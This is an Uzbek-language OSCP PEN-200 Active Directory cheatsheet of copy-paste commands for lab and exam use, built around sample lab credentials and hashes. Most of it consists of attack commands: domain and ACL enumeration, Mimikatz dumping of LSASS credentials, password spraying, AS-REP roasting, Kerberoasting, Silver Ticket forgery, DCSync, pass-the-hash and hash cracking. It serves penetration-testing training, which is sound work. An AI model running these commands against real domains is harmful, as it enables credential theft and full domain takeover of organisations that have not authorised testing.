# OSCP Active Directory Cheatsheet (PEN-200: Modul 22 & 23)

> **PEN-200 Active Directory (Modul 22: Introduction & Enumeration | Modul 23: Attacking Authentication)**  
> OSCP imtihoni va AD lablari uchun maksimal qulay, tezkor nusxalashga (copy-paste) mo'ljallangan amaliy cheetsheet.

---

## Mundarija
1. [Dastlabki Ulanish va PowerShell Muhiti](#1-dastlabki-ulanish-va-powershell-muhiti)
2. [Legacy Windows Tools (net.exe & CMD)](#2-legacy-windows-tools-netexe--cmd)
3. [PowerShell & .NET LDAP Enumeration](#3-powershell--net-ldap-enumeration)
4. [PowerView orqali Domen Enumeration](#4-powerview-orqali-domen-enumeration)
5. [Foydalanuvchi Sessiyalari va Tizimga Kirganlarni Aniqlash (PSTools)](#5-foydalanuvchi-sessiyalari-va-tizimga-kirganlarni-aniqlash-pstools)
6. [Obyekt Huquqlari va ACL Enumeration](#6-obyekt-huquqlari-va-acl-enumeration)
7. [Domen Ulashilgan Papkalari (Shares) va GPP Parollari](#7-domen-ulashilgan-papkalari-shares-va-gpp-parollari)
8. [Avtomatlashtirilgan Enumeration (SharpHound & BloodHound)](#8-avtomatlashtirilgan-enumeration-sharphound--bloodhound)
9. [Xotiradan Hisob Ma'lumotlarini O'g'irlash (LSASS & Mimikatz)](#9-xotiradan-hisob-malumotlarini-ogirlash-lsass--mimikatz)
10. [Parol Siyosati va Parol Hujumlari (Password Spraying)](#10-parol-siyosati-va-parol-hujumlari-password-spraying)
11. [AS-REP Roasting](#11-as-rep-roasting)
12. [Kerberoasting](#12-kerberoasting)
13. [Silver Ticket Hujumi (TGS Forgery)](#13-silver-ticket-hujumi-tgs-forgery)
14. [DCSync Hujumi (Domain Controller Synchronization)](#14-dcsync-hujumi-domain-controller-synchronization)

---

## 1. Dastlabki Ulanish va PowerShell Muhiti

### Kali-dan Windows targetga RDP orqali ulanish
```bash
xfreerdp /u:<USER> /d:<DOMAIN> /p:'<PASSWORD>' /v:<TARGET_IP>
```
*OffSec misol:*
```bash
xfreerdp /u:stephanie /d:corp.com /p:'LegmanTeamBenzoin!!' /v:192.168.50.75
```

### RDP sertifikat xatosini chetlab o'tib ulanish
```bash
xfreerdp /cert-ignore /u:<USER> /d:<DOMAIN> /p:'<PASSWORD>' /v:<TARGET_IP>
```

### PowerShell Execution Policy cheklovini aylanib o'tib ochish
```cmd
powershell -ep bypass
```

---

## 2. Legacy Windows Tools (net.exe & CMD)

### Domendagi barcha foydalanuvchilar ro'yxatini olish
```cmd
net user /domain
```

### Muayyan domen foydalanuvchisi haqida to'liq ma'lumot (guruhlari, lockout, parol vaqti)
```cmd
net user <USERNAME> /domain
```
*OffSec misol:*
```cmd
net user jeffadmin /domain
```

### Domendagi barcha global guruhlarni ko'rish
```cmd
net group /domain
```

### Muayyan domen guruhi a'zolarini ko'rish
```cmd
net group "<GROUP_NAME>" /domain
```
*OffSec misol:*
```cmd
net group "Sales Department" /domain
```

### Domendagi parol siyosati va lockout chegarasini tekshirish
```cmd
net accounts
```

### Foydalanuvchini domen guruhiga qo'shish (Privilege mavjud bo'lganda)
```cmd
net group "<GROUP_NAME>" <USER> /add /domain
```
*OffSec misol:*
```cmd
net group "Management Department" stephanie /add /domain
```

### Foydalanuvchini domen guruhidan o'chirish (Tozalash uchun)
```cmd
net group "<GROUP_NAME>" <USER> /del /domain
```
*OffSec misol:*
```cmd
net group "Management Department" stephanie /del /domain
```

---

## 3. PowerShell & .NET LDAP Enumeration

### Joriy domen obyektini olish
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

### Primary Domain Controller (PDC) nomini aniqlash
```powershell
$PDC = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner.Name; $PDC
```

### Domen Distinguished Name (DN) qiymatini olish
```powershell
$DN = ([adsi]'').distinguishedName; $DN
```

### LDAP ulanish satrini shakllantirish
```powershell
$LDAP = "LDAP://$PDC/$DN"; $LDAP
```

### LDAP orqali barcha obyektlarni qidiruvchi ob'ekt yaratish
```powershell
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
```

### LDAP Filter: Barcha domen foydalanuvchilarini qidirish (samAccountType)
```powershell
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()
```

### LDAP Filter: Muayyan foydalanuvchi guruhlarini (memberof) ko'rish
```powershell
$dirsearcher.filter="name=<USERNAME>"
$result = $dirsearcher.FindAll()
$result.properties.memberof
```

### Qayta ishlatiluvchi LDAPSearch funksiyasini yuklash (Bitta blokda)
```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
```

### LDAPSearch: Barcha foydalanuvchilarni ro'yxatlash
```powershell
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
```

### LDAPSearch: Barcha guruhlarni ro'yxatlash
```powershell
LDAPSearch -LDAPQuery "(objectCategory=group)"
```

### LDAPSearch: Muayyan guruh a'zolarini ko'rish
```powershell
(LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=<GROUP_NAME>))").properties.member
```
*OffSec misol:*
```powershell
(LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))").properties.member
```

### LDAP orqali hisob ma'lumotlarini (foydalanuvchi/parol) tekshirish
```powershell
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "<USER>", "<PASSWORD>")
```
*OffSec misol:*
```powershell
New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC1.corp.com/DC=corp,DC=com", "pete", "Nexus123!")
```

---

## 4. PowerView orqali Domen Enumeration

### PowerView modulini sessiyaga yuklash
```powershell
Import-Module .\PowerView.ps1
```

### Domen haqida to'liq ma'lumot olish
```powershell
Get-NetDomain
```

### Barcha domen foydalanuvchilarini ro'yxatlash
```powershell
Get-NetUser | select samaccountname,cn,description
```

### Foydalanuvchilarning parol o'zgarishi va oxirgi kirish vaqtini ko'rish
```powershell
Get-NetUser | select cn,pwdlastset,lastlogon
```

### Domendagi barcha guruhlar ro'yxatini ko'rish
```powershell
Get-NetGroup | select cn
```

### Muayyan guruh a'zolarini ko'rish
```powershell
Get-NetGroup "<GROUP_NAME>" | select member
```
*OffSec misol:*
```powershell
Get-NetGroup "Sales Department" | select member
```

### Domendagi barcha kompyuterlar va ularning operatsion tizimini ko'rish
```powershell
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

### Joriy foydalanuvchi domendagi qaysi mashinalarda Local Admin ekanligini topish
```powershell
Find-LocalAdminAccess
```

### Ro'yxatdan o'tgan SPN (Service Principal Name) hisoblarini topish (Kerberoasting uchun)
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### SPN da ko'rsatilgan xost nomining IP manzilini tekshirish
```cmd
nslookup.exe <HOSTNAME>
```

---

## 5. Foydalanuvchi Sessiyalari va Tizimga Kirganlarni Aniqlash (PSTools)

### Masofaviy mashinadagi faol sessiyalarni ko'rish (PowerView)
```powershell
Get-NetSession -ComputerName <COMPUTER_NAME> -Verbose
```

### PsLoggedon yordamida mashinaga kirgan/ulangan foydalanuvchilarni aniqlash
```cmd
.\PsLoggedon.exe \\<COMPUTER_NAME>
```
*OffSec misol:*
```cmd
.\PsLoggedon.exe \\files04
```

---

## 6. Obyekt Huquqlari va ACL Enumeration

### Muayyan foydalanuvchi/obyektga tegishli ACL ruxsatlarini olish
```powershell
Get-ObjectAcl -Identity <IDENTITY>
```
*OffSec misol:*
```powershell
Get-ObjectAcl -Identity stephanie
```

### SID qiymatini foydalanuvchi/guruh nomiga aylantirish
```powershell
Convert-SidToName <SID>
```
*OffSec misol:*
```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

### Bir nechta SID larni birdaniga nomga aylantirish
```powershell
"<SID1>","<SID2>" | Convert-SidToName
```

### Muayyan guruhda to'liq huquqqa (GenericAll) ega bo'lgan subyektlarni filtrlash
```powershell
Get-ObjectAcl -Identity "<GROUP_NAME>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
*OffSec misol:*
```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

---

## 7. Domen Ulashilgan Papkalari (Shares) va GPP Parollari

### Domendagi barcha ochiq SMB tarmoq papkalarini (Shares) qidirish
```powershell
Find-DomainShare
```

### Domain Controller SYSVOL siyosat papkalarini ko'rish
```powershell
ls \\<DC_FQDN>\sysvol\<DOMAIN>\Policies\
```
*OffSec misol:*
```powershell
ls \\dc1.corp.com\sysvol\corp.com\Policies\
```

### SYSVOL ichidagi backup yoki XML fayllardan cpassword qidirish
```powershell
cat \\<DC_FQDN>\sysvol\<DOMAIN>\Policies\<POLICY_GUID>\*.xml
```

### Kali-da GPP shifrlangan cpassword parolini ochish
```bash
gpp-decrypt "<CPASSWORD>"
```
*OffSec misol:*
```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

### Topilgan domen tarmoq papkasini (Share) tekshirish
```powershell
ls \\<COMPUTER_NAME>\<SHARE_NAME>
```
*OffSec misol:*
```powershell
ls \\FILES04\docshare
```

---

## 8. Avtomatlashtirilgan Enumeration (SharpHound & BloodHound)

### SharpHound PowerShell modulini yuklash
```powershell
Import-Module .\SharpHound.ps1
```

### SharpHound orqali domendan barcha ma'lumotlarni yig'ish (ZIP arxiv yaratadi)
```powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\<USER>\Desktop\ -OutputPrefix "corp audit"
```

### SharpHound.exe (Binary) orqali barcha ma'lumotlarni yig'ish
```cmd
.\SharpHound.exe -c All --zipfilename "corp_audit"
```

### Kali-da Neo4j graflar bazasini ishga tushirish
```bash
sudo neo4j start
```

### Kali-da BloodHound GUI dasturini ochish (Zip faylni drag-and-drop qiling)
```bash
bloodhound
```

---

## 9. Xotiradan Hisob Ma'lumotlarini O'g'irlash (LSASS & Mimikatz)

### Mimikatz dasturini ishga tushirish
```cmd
.\mimikatz.exe
```

### Debug imtiyozini (SeDebugPrivilege) yoqish
```mimikatz
privilege::debug
```

### LSASS xotirasidan barcha NTLM hashlar va ochiq parollarni dump qilish
```mimikatz
sekurlsa::logonpasswords
```

### LSASS xotirasida keshda saqlangan barcha Kerberos chiptalarini ko'rish
```mimikatz
sekurlsa::tickets
```

---

## 10. Parol Siyosati va Parol Hujumlari (Password Spraying)

### Domen lockout siyosatini tekshirish (Lockout threshold qiymatiga qarang!)
```cmd
net accounts
```

### PowerShell orqali bitta parolni barcha foydalanuvchilarga sinab ko'rish (Spray-Passwords.ps1)
```powershell
.\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
```
*OffSec misol:*
```powershell
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

### Kali-dan CrackMapExec / NetExec yordamida SMB orqali Spray qilish
```bash
crackmapexec smb <TARGET_IP> -u users.txt -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
```
*OffSec misol:*
```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

### Kerbrute yordamida Kerberos Pre-Auth orqali parollarni xavfsiz spray qilish (Windows / Kali)
```cmd
.\kerbrute_windows_amd64.exe passwordspray -d <DOMAIN> .\usernames.txt "<PASSWORD>"
```
*OffSec misol:*
```cmd
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

---

## 11. AS-REP Roasting

> **Talab:** `DONT_REQ_PREAUTH` (Kerberos Pre-autentifikatsiya talab qilinmaydigan) hisoblar.

### Kali-dan Impacket orqali AS-REP hashlarni tortib olish
```bash
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile hashes.asreproast <DOMAIN>/<USER>
```
*OffSec misol:*
```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

### Kali-dan barcha ro'yxatdagi foydalanuvchilar bo'yicha parolsiz AS-REP so'rash
```bash
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile hashes.asreproast <DOMAIN>/ -usersfile users.txt -no-pass
```

### Windows-dan Rubeus orqali barcha AS-REP hashlarni olish
```cmd
.\Rubeus.exe asreproast /nowrap /outfile:hashes.asreproast
```

### Hashcat yordamida AS-REP hashlarni sindirish (Mode 18200)
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

---

## 12. Kerberoasting

> **Talab:** SPN (Service Principal Name) biriktirilgan domen hisobi (Domain User huquqi kifoya).

### Windows-dan PowerView orqali SPN ga ega foydalanuvchilarni topish
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### Windows-dan Rubeus yordamida barcha TGS chiptalarini so'rash va hashlarni saqlash
```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

### Kali-dan Impacket yordamida Kerberoast chiptalarini so'rash
```bash
sudo impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
```
*OffSec misol:*
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

### Hashcat yordamida Kerberoast TGS hashlarni sindirish (Mode 13100)
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

---

## 13. Silver Ticket Hujumi (TGS Forgery)

> **Talab:** Servis hisobining NTLM xashi (masalan sekurlsa yoki Kerberoasting orqali olingan), Domain SID, Servis turi (HTTP, CIFS, MSSQL) va Target Hostname.

### Domen SID qiymatini aniqlash
```cmd
whoami /user
```
*(Chiqgan SID ning oxirgi RID qismini (masalan `-1104`) olib tashlasangiz, qolgan qismi Domain SID bo'ladi: masalan `S-1-5-21-1987370270-658905905-1781884369`)*

### Mimikatz orqali Silver Ticket yasash va joriy sessiyaga kiritish (/ptt)
```mimikatz
kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /ptt /target:<TARGET_FQDN> /service:<SERVICE> /rc4:<SERVICE_NTLM_HASH> /user:<DESIRED_ADMIN_USER>
```
*OffSec misol:*
```mimikatz
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

### Kiritilgan soxta Kerberos chiptasini tekshirish
```cmd
klist
```

### Silver Ticket orqali ruxsatsiz veb-servisga murojaat qilish
```powershell
iwr -UseDefaultCredentials http://<TARGET_HOST>
```
*OffSec misol:*
```powershell
iwr -UseDefaultCredentials http://web04
```

### Silver Ticket orqali CIFS/SMB fayl tizimiga kirish
```cmd
dir \\<TARGET_FQDN>\c$
```

---

## 14. DCSync Hujumi (Domain Controller Synchronization)

> **Talab:** Domain Admins, Enterprise Admins yoki `DS-Replication-Get-Changes` huquqiga ega akkaunt.

### Windows-da Mimikatz orqali muayyan foydalanuvchi hashini DCSync qilish
```mimikatz
lsadump::dcsync /user:<DOMAIN>\<TARGET_USER>
```
*OffSec misol:*
```mimikatz
lsadump::dcsync /user:corp\Administrator
```
*krbtgt hisobining hashini olish:*
```mimikatz
lsadump::dcsync /user:corp\krbtgt
```

### Kali-dan Impacket secretsdump yordamida bitta foydalanuvchini DCSync qilish
```bash
impacket-secretsdump -just-dc-user <TARGET_USER> <DOMAIN>/<ADMIN_USER>:'<PASSWORD>'@<DC_IP>
```
*OffSec misol:*
```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

### Kali-dan Impacket secretsdump orqali butun domenni DCSync qilish (Barcha NT hashlar)
```bash
impacket-secretsdump -just-dc <DOMAIN>/<ADMIN_USER>:'<PASSWORD>'@<DC_IP>
```

### Impacket secretsdump orqali NT hash bilan kirib (Pass-The-Hash) DCSync qilish
```bash
impacket-secretsdump -just-dc -hashes :<NTLM_HASH> <DOMAIN>/<ADMIN_USER>@<DC_IP>
```

### DCSync orqali olingan NTLM hashni Hashcat orqali sindirish (Mode 1000)
```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
